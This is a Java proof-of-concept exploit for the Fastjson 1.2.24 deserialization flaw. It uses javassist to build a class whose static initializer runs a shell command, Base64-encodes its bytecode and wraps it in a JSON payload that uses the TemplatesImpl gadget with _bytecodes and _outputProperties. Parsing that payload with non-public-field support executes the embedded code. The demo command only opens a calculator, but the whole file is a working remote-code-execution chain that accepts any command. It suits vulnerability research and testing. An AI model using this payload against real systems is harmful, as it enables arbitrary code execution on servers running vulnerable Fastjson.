package org.h3rmesk1t.Fastjson.fastjson24;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.codec.binary.Base64;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/2/7 11:18 下午
 */
public class POC1 {

    public static class H3rmesk1t {

    }

    public static String makeClass() throws Exception {

        ClassPool pool = ClassPool.getDefault();
        CtClass cc = pool.get(H3rmesk1t.class.getName());
        String cmd = "java.lang.Runtime.getRuntime().exec(\"open -a Calculator\");";
        cc.makeClassInitializer().insertBefore(cmd);
        String randomClassName = "H3rmesk1t" + System.nanoTime();
        cc.setName(randomClassName);
        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));
        byte[] evilCode = cc.toBytecode();

        return Base64.encodeBase64String(evilCode);
    }

    public static String exploitString() throws Exception {

        String evilCodeBase64 = makeClass();
        final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
        String exploit = "{'d1no':{" +
                "\"@type\":\"" + NASTY_CLASS + "\"," +
                "\"_bytecodes\":[\"" + evilCodeBase64 + "\"]," +
                "'_name':'h3rmesk1t'," +
                "'_tfactory':{}," +
                "'_outputProperties':{}" +
                "}}\n";

        return exploit;
    }

    public static void main(String[] args) throws Exception {

        String exploit = exploitString();
        System.out.println(exploit);
        JSON.parse(exploit, Feature.SupportNonPublicField);
        // JSON.parseObject(exploit, Feature.SupportNonPublicField); -> success
        // JSON.parseObject(exploit, Object.class, Feature.SupportNonPublicField); -> success
    }
}
